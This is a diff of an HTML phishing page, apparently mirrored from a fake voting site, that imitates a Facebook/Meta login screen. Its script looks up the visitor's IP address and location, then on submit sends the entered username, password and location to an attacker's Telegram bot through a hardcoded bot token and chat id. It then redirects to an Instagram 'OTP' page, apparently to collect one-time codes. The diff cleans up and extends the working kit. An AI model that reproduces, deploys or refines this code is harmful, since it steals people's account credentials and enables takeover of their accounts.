@@ -1,114 +1,111 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from voting.name.ng/slink/vote-ig-fashion_dar_v/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Mar 2025 20:44:54 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
-    <script src="https://cdn.tailwindcss.com/"></script>
-    <link href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet"/>
-    <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background: linear-gradient(to bottom right, #fbe0ff00, #c9ebf000);
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com/"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(to bottom right, #fbe0ff00, #c9ebf000);
+    }
+  </style>
 </head>
 <body class="flex items-center justify-center min-h-screen">
-     <div class="w-full max-w-sm p-6 rounded-lg">
-        <div class="text-center mb-6">
-            <img alt="Facebook logo" class="mx-auto mb-4" height="80" src="https://i.postimg.cc/FKk4ZQ1r/60ed83ab035dbe00046c24b8.png" width="70"/>
-        </div>
-        <br><br>
-        <form id="contactForm" method="POST">
-<input type="text" id="ipaddress" name="IPaddress" hidden>
-       <input type="hidden" id="city" name="city">
-<input type="hidden" id="country" name="country">
-            
-
-            <div class="mb-4">
-                <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder="Phone number, username, or email" type="text" name="username" id="username" required/>
-            </div>
-            <div class="mb-4">
-                <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="text" name="password" id="password" required/>
-            </div>
-            <div class="mb-4">
-                <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit" id="button" value="submit">
-                    Log in
-                </button>
-            </div>
-            <div class="text-center mb-4">
-                <a class="text-black-600 hover:underline" href="#">
-                    Forgotten Password?
-                </a>
-            </div>
-            <br><br><br><br><br>
-            <div class="text-center mb-4">
-                <button class="w-full py-3 border border-blue-600 text-blue-600 rounded-xl hover:bg-blue-50" type="button">
-                    Create new account
-                </button>
-            </div>
-            <div class="text-center mt-6">
-                <img alt="Meta logo" class="mx-auto mb-2" height="20" src="https://i.postimg.cc/DZY1KLnd/pngegg-2.png" width="70"/>
-            </div>
-                    </form>
+  <div class="w-full max-w-sm p-6 rounded-lg">
+    <div class="text-center mb-6">
+      <img alt="Facebook logo" class="mx-auto mb-4" height="80" src="https://i.postimg.cc/FKk4ZQ1r/60ed83ab035dbe00046c24b8.png" width="70"/>
     </div>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipaddress = data.ip;
-                    document.getElementById('ipaddress').value = ipaddress;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                });
-        });
-  fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById('city').value = data.city || '';
-        document.getElementById('country').value = data.country_name || '';
-      })
-      .catch(error => console.error('Location error:', error));
-  document.getElementById('contactForm').addEventListener('submit', function (event) {
-            event.preventDefault();
+    <form id="contactForm" method="POST">
+      <input type="hidden" id="ipaddress" name="IPaddress">
+      <input type="hidden" id="city" name="city">
+      <input type="hidden" id="country" name="country">
 
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var ipaddress = document.getElementById('ipaddress').value;
-   
-            const city = document.getElementById('city').value;
-      const country = document.getElementById('country').value;
-            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
-           
-          var token = '7245614431:AAFDtt-ZsldZkJNYyX4foQB7wqvCJz0nrZA';
+      <div class="mb-4">
+        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder="Phone number, username, or email" type="text" name="username" id="username" required/>
+      </div>
+      <div class="mb-4">
+        <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="password" name="password" id="password" required/>
+      </div>
+      <div class="mb-4">
+        <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit" id="button" value="submit">
+          Log in
+        </button>
+      </div>
+      <div class="text-center mb-4">
+        <a class="text-black-600 hover:underline" href="#">Forgotten Password?</a>
+      </div>
+
+      <div class="text-center mb-4 mt-10">
+        <button class="w-full py-3 border border-blue-600 text-blue-600 rounded-xl hover:bg-blue-50" type="button">
+          Create new account
+        </button>
+      </div>
+      <div class="text-center mt-6">
+        <img alt="Meta logo" class="mx-auto mb-2" height="20" src="https://i.postimg.cc/DZY1KLnd/pngegg-2.png" width="70"/>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      // Fetch IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          document.getElementById('ipaddress').value = data.ip || '';
+        })
+        .catch(error => {
+          console.error('IP Fetch Error:', error);
+          alert('Failed to fetch IP address. Please try again.');
+        });
+
+      // Fetch location data
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          document.getElementById('city').value = data.city || '';
+          document.getElementById('country').value = data.country_name || '';
+        })
+        .catch(error => {
+          console.error('Location Fetch Error:', error);
+          alert('Failed to fetch location info.');
+        });
+
+      // Form submission
+      document.getElementById('contactForm').addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        var ipaddress = document.getElementById('ipaddress').value;
+        var city = document.getElementById('city').value;
+        var country = document.getElementById('country').value;
+
+        var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP: ${ipaddress}\nCity: ${city}\nCountry: ${country}`;
+
+        var token = '7245614431:AAFDtt-ZsldZkJNYyX4foQB7wqvCJz0nrZA';
         var chat_id = '6961550883';
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';  // Redirect to thank you page
-                    } else {
-                        alert('Error sending message.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-        });
-
-    </script>
+        fetch(url)
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';
+            } else {
+              alert('Failed to send data. Try again.');
+            }
+          })
+          .catch(error => {
+            console.error('Telegram Error:', error);
+            alert('Network error. Please check your connection.');
+          });
+      });
+    });
+  </script>
 </body>
-
-<!-- Mirrored from voting.name.ng/slink/vote-ig-fashion_dar_v/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Mar 2025 20:44:55 GMT -->
 </html>
